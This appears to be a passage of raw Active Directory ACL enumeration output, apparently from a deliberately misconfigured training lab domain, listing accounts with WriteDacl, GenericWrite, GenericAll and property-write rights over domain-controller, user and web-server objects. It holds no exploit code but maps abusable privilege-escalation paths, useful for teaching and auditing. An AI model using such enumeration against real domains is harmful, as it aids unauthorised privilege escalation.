IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=l.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : DC=m.root-servers.net,DC=RootDNSServers,CN=MicrosoftDNS,CN=System,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : CreateChild, DeleteChild, ListChildren, ReadProperty, DeleteTree, ExtendedRight, Delete, 
                          GenericWrite, WriteDacl, WriteOwner
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1110
IdentityReferenceName   : DnsAdmins
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=DnsAdmins,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : group

ObjectDN                : CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1009
IdentityReferenceName   : FIRST-DC$
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
IdentityReferenceClass  : computer

ObjectDN                : CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteDacl
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1124
IdentityReferenceName   : writedacldc.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=writedacldc.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1120
IdentityReferenceName   : compwrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=compwrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain 
                          Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1009
IdentityReferenceName   : FIRST-DC$
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
IdentityReferenceClass  : computer

ObjectDN                : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain 
                          Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteDacl
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1124
IdentityReferenceName   : writedacldc.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=writedacldc.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain 
                          Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1120
IdentityReferenceName   : compwrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=compwrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain 
                          Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : All
AceFlags                : Inherited
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1009
IdentityReferenceName   : FIRST-DC$
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=FIRST-DC,OU=Domain Controllers,DC=spartancybersec,DC=corp
IdentityReferenceClass  : computer

ObjectDN                : CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain 
                          Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteDacl
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1124
IdentityReferenceName   : writedacldc.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=writedacldc.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=SYSVOL Subscription,CN=Domain System Volume,CN=DFSR-LocalSettings,CN=FIRST-DC,OU=Domain 
                          Controllers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit, Inherited
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1120
IdentityReferenceName   : compwrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=compwrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=constrained.user,CN=Users,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericWrite
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1117
IdentityReferenceName   : userwrite.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=userwrite.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=userwrite.user,CN=Users,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : GenericAll
ObjectAceType           : None
AceFlags                : ContainerInherit
AceType                 : AccessAllowed
InheritanceFlags        : ContainerInherit
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1118
IdentityReferenceName   : userall.user
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=userall.user,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=WEBSERVER,CN=Computers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : User-Logon
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1130
IdentityReferenceName   : adminwebserver
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=AdminWebServer,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=WEBSERVER,CN=Computers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : Description
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1130
IdentityReferenceName   : adminwebserver
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=AdminWebServer,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=WEBSERVER,CN=Computers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : Display-Name
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1130
IdentityReferenceName   : adminwebserver
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=AdminWebServer,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=WEBSERVER,CN=Computers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : SAM-Account-Name
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1130
IdentityReferenceName   : adminwebserver
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=AdminWebServer,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=WEBSERVER,CN=Computers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : WriteProperty
ObjectAceType           : User-Account-Restrictions
AceFlags                : None
AceType                 : AccessAllowedObject
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1130
IdentityReferenceName   : adminwebserver
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=AdminWebServer,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user

ObjectDN                : CN=WEBSERVER,CN=Computers,DC=spartancybersec,DC=corp
AceQualifier            : AccessAllowed
ActiveDirectoryRights   : ExtendedRight, GenericRead
ObjectAceType           : None
AceFlags                : None
AceType                 : AccessAllowed
InheritanceFlags        : None
SecurityIdentifier      : S-1-5-21-1861162130-2580302541-221646211-1130
IdentityReferenceName   : adminwebserver
IdentityReferenceDomain : spartancybersec.corp
IdentityReferenceDN     : CN=AdminWebServer,CN=Users,DC=spartancybersec,DC=corp
IdentityReferenceClass  : user
```





[^1]: 
